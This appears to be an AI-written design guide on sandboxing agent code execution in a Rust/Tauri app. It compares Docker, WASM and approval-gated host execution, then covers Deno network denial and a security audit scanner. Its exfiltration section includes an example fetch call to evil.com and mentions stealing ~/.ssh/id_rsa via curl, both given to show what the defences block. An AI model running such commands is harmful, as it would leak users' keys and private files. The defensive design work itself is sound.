# Sandboxing & Code Execution (Node.js vs. ThinClaw)

One of the most dangerous things an AI agent can do is execute code or bash scripts on the user's machine.

To solve this, OpenClaw relies on a dual-strategy model: a strict **Docker sandbox** for untrusted code, and a heavily gated **Host execution** mode for when the agent legitimately needs to control the user's computer.

Here is exactly how OpenClaw handles this today, and how you should redesign it for ThinClaw (your Rust/Tauri app).

---

## 1. How OpenClaw Does It Today

### A. The Docker Sandbox (`sandbox: "docker"`)

By default, when the OpenClaw Pi Agent decides to use the `bash-tool` or write a Python/Node script to solve a math problem, it does **not** run it on your Mac.

1. The Node.js backend spins up a temporary Docker container (usually using a generic Ubuntu or Alpine image).
2. It executes the script _inside_ that container.
3. It captures the stdout/stderr and returns it to the agent.
4. It destroys the container.

This guarantees the agent can't accidentally `rm -rf /` your hard drive.

### B. The Host Execution Mode (`sandbox: "host"`)

Sometimes the user _wants_ the agent to control their computer (e.g., "Mute my volume" or "Find the large PDF on my Desktop").

1. The agent requests to run a command on the host.
2. The Node.js backend intercepts this and goes into an **Approval Pause**.
3. It sends a WebSocket message to the macOS Swift Companion App.
4. A native Mac popup appears: _"The Agent wants to run `osascript -e 'set volume with output muted'`. Approve or Deny?"_
5. Only if the user clicks **Approve** does the Node.js backend actually run the command via `child_process.exec()`.

---

## 2. How ThinClaw Should Do It (The Rust Advantage)

Because ThinClaw is a single Tauri binary written in Rust, you have far more elegant (and faster) options for sandboxing than spinning up heavy Node.js child processes.

### Option 1: Replicate the Docker Sandbox (Heavy, but familiar)

If you want to keep OpenClaw's exact behavior, Rust handles Docker beautifully.

Instead of shelling out to `docker run`, you can use the **`bollard`** crate natively in your Rust backend. It speaks directly to the Docker daemon API over socket.

```rust
use bollard::Docker;
use bollard::exec::{CreateExecOptions, StartExecResults};

// Start an Alpine container, run the agent's bash script, and capture the output safely
let docker = Docker::connect_with_local_defaults().unwrap();
let exec = docker.create_exec("agent-sandbox-container", CreateExecOptions {
    cmd: Some(vec!["bash", "-c", "echo 'Hello from the Sandbox'"]),
    attach_stdout: Some(true),
    ..Default::default()
}).await?;
```

### Option 2: The Modern Sandbox: WebAssembly (`wasmtime`)

Docker is heavy. It requires the user to have Docker Desktop running on their Mac.

A far more modern and lightweight approach for AI agents is to use **WebAssembly (WASM)**. Using the **`wasmtime`** crate, your Rust backend can create a completely secure, microscopic virtual machine in milliseconds, run a script (Compiled to WASM, or running inside a WASM JavaScript engine), and instantly kill it.

- **Pros:** Instant boot times, uses almost zero memory, highly secure, requires no extra software installed by the user.
- **Cons:** The agent can only write code in languages that compile to WASM (or you have to bundle a tiny JS interpreter like `rquickjs`).

### Option 3: Host Execution with Tauri Approvals (The macOS Native Way)

When your agent actually _does_ need to touch the user's macOS filesystem (which is likely the main reason you are building a native desktop app!), you will bypass Docker entirely and build the approval UI into your Tauri frontend.

**The ThinClaw Execution Loop:**

1. The RIG Agent decides it needs to run a bash script to search the user's Desktop.
2. Your Rust backend intercepts the request and pauses the agent thread.
3. Rust emits a Tauri IPC event to your React/Vue frontend: `app.emit("request-approval", { command: "ls ~/Desktop" })`.
4. Your frontend renders a beautiful modal warning the user.
5. The user clicks **Approve**.
6. The frontend sends an IPC back to Rust `invoke("approve_execution")`.
7. Rust safely executes the command using `std::process::Command` and returns the string output to the paused RIG Agent.

```rust
// Rust Backend
fn execute_host_command(cmd: &str) -> Result<String, Error> {
    // 1. Pause and Ask Tauri Frontend for permission
    wait_for_user_approval(cmd)?;

    // 2. If approved, execute natively on the Mac
    let output = std::process::Command::new("sh")
        .arg("-c")
        .arg(cmd)
        .output()?;

    Ok(String::from_utf8_lossy(&output.stdout).to_string())
}
```

## 3. The Data Exfiltration Problem (Leaking Personal Data)

Your concern is 100% valid. If you choose **Option 3**, you give the agent access to your personal files. What stops the agent from reading your `~/.ssh/id_rsa` and sending it to an attacker's website via a `curl` command?

If you use Option 3, you **must** implement Exfiltration Protections.

### Strategy A: The "Local-Only" Airgap (Best — Local Mode Only)

> ⚠️ **Scope:** This strategy applies **only when the Orchestrator is running inside the local Tauri app**. When the Orchestrator is deployed headless on a remote VPS, bash execution is always local to the *server* (not the user's personal machine), regardless of which LLM is used — so this restriction is not needed and would wrongly break the agent's core functionality.

Because you have `llama.cpp` and `MLX` running as local sidecars (in Local Tauri Mode), you can create a "Network-Gated" agent mode.

- If the user selects a cloud model (e.g., OpenAI/Anthropic), the **local Tauri agent** is **banned** from using the Host Execution bash tool entirely. It is only allowed to use Web Search.
- If the user selects your local `MLX` model, the agent is granted access to the Host Execution tool.
  Since the MLX model runs entirely on your Mac and has no internet access, even if the agent reads your social security number, it _literally cannot send it anywhere_.

### Strategy B: Deno Sandbox (Granular Permissions)

Instead of letting the agent run raw unrestricted `bash` commands via `std::process`, force the agent to only write and execute `Deno` (JavaScript/TypeScript) scripts.
Deno is unique because it forces you to explicitly grant permissions _at execution time_.

```rust
// Run a script, but explicitly DENY all network access so it can't leak data!
let output = std::process::Command::new("deno")
    .arg("run")
    .arg("--allow-read") // It can read the hard drive
    .arg("--deny-net")   // It CANNOT talk to the internet
    .arg("agent_script.js")
    .output()?;
```

If the script tries to run `fetch("http://evil.com/steal?data=" + file)`, the Deno runtime instantly crashes the script and throws a permission error.

## 4. How the Agent Accesses Knowledge inside a Sandbox

A common point of confusion: **The Agent itself is NOT sandboxed.** Only the _code the Agent writes and executes_ is sandboxed.

Your Rust/Tauri backend (which runs the `rig-core` agent) runs with the full permissions of the macOS user.

- The Rust agent **can** connect to the SQLite memory database.
- The Rust agent **can** search the web.
- The Rust agent **can** read files you explicitly drop into the UI.

### How the two communicate

When the Rust Agent decides it needs to write a Python or Deno script to analyze a massive CSV file, it needs a way to hand that file to the restricted sandbox.

Here is the flow:

1. **The Rust Agent creates a Temporary Directory:** `mkdir /tmp/sandbox-123`
2. **The Rust Agent mounts data:** It copies the knowledge base documents, the CSVs, or the specific text snippets the agent retrieved into `/tmp/sandbox-123/data.csv`.
3. **The Sandbox Execution:** The Rust Agent runs `deno run --allow-read=/tmp/sandbox-123 --deny-net script.js`.
4. **The Sandbox returns results:** The Deno script reads the CSV, analyzes it, and prints the result to `stdout` (or writes to `/tmp/sandbox-123/output.txt`).
5. **The Rust Agent cleans up:** The Rust agent reads the result, passes the analysis back to the LLM's context window, and `rm -rf /tmp/sandbox-123`.

This pattern—mounting specific, tightly controlled files into an execution environment—is how you give the AI access to your knowledge base without letting the script freely browse your `~/.ssh` directory or talk to the internet.

## 5. Security Audit Engine (Automated Config Scanner)

OpenClaw's `src/security/` subsystem (28 files, 38KB + 89KB tests) runs a comprehensive automated security audit. ThinClaw should replicate this as a boot-time and on-demand scanner.

### What It Scans

The `runSecurityAudit()` function performs these checks:

| Check Category | Examples |
|---|---|
| **Gateway Config** | Auth enabled? Password strength? CORS origins? Trusted proxy hops? HTTP tool denylists? |
| **Browser Control** | Browser tool enabled without sandbox? evaluate() allowed? |
| **Exec Runtime** | Safe-bin policy violations? Trusted dirs pointing at writable locations? |
| **Channel Security** | DM policy too permissive? AllowFrom missing? Bot token exposed? |
| **Filesystem** | State directory permissions? Config file world-readable? |
| **Dangerous Flags** | `autoApprove: true`? `allowUnsafeExternalContent`? `disableSandbox`? |
| **Logging** | Sensitive data in logs? Log verbosity exposing secrets? |
| **Skills** | Skill scripts containing `eval()`, `exec()`, network calls? |

### Severity Levels

```rust
pub enum AuditSeverity {
    Critical,  // Immediate security risk, should block startup
    Warn,      // Misconfiguration that could be exploited
    Info,      // Best-practice recommendation
}

pub struct AuditFinding {
    pub check_id: String,         // e.g., "gateway-no-auth"
    pub severity: AuditSeverity,
    pub title: String,
    pub detail: String,
    pub remediation: Option<String>,
}
```

### Rust Implementation

```rust
pub struct SecurityAuditor {
    config: AppConfig,
    state_dir: PathBuf,
}

impl SecurityAuditor {
    /// Run full audit — called on boot and via `/doctor security`
    pub async fn run(&self) -> SecurityAuditReport {
        let mut findings = Vec::new();

        findings.extend(self.audit_gateway_config());
        findings.extend(self.audit_exec_runtime());
        findings.extend(self.audit_channel_security());
        findings.extend(self.audit_dangerous_flags());
        findings.extend(self.audit_filesystem().await);
        findings.extend(self.audit_skills().await);

        let summary = AuditSummary {
            critical: findings.iter().filter(|f| f.severity == Critical).count(),
            warn: findings.iter().filter(|f| f.severity == Warn).count(),
            info: findings.iter().filter(|f| f.severity == Info).count(),
        };

        SecurityAuditReport { findings, summary, timestamp: now_ms() }
    }
}
```

### Auto-Fix

OpenClaw can automatically fix certain findings (e.g., tightening file permissions, removing deprecated config keys). The `fix.ts` module applies safe remediations. ThinClaw should support `thinclaw doctor --fix` for the same behavior.

---

## Summary Recommendation

For ThinClaw, I recommend a hybrid approach.

1. Build **Option 3 (Host Execution with Tauri Approvals)** because it's the most powerful way to control your computer.
2. Mitigate the exfiltration risk by using the **Deno Sandbox** approach. Force the AI to write Deno scripts instead of bash scripts, so your Rust backend can lock down network egress (`--deny-net`) while explicitly allowing read access _only_ to a temporary mounted directory (`--allow-read=/tmp/sandbox_dir`).
3. Limit the scariest commands to **Local Inference Only**.
4. Run the **Security Audit** on every boot and surface warnings in the Tauri UI status panel.
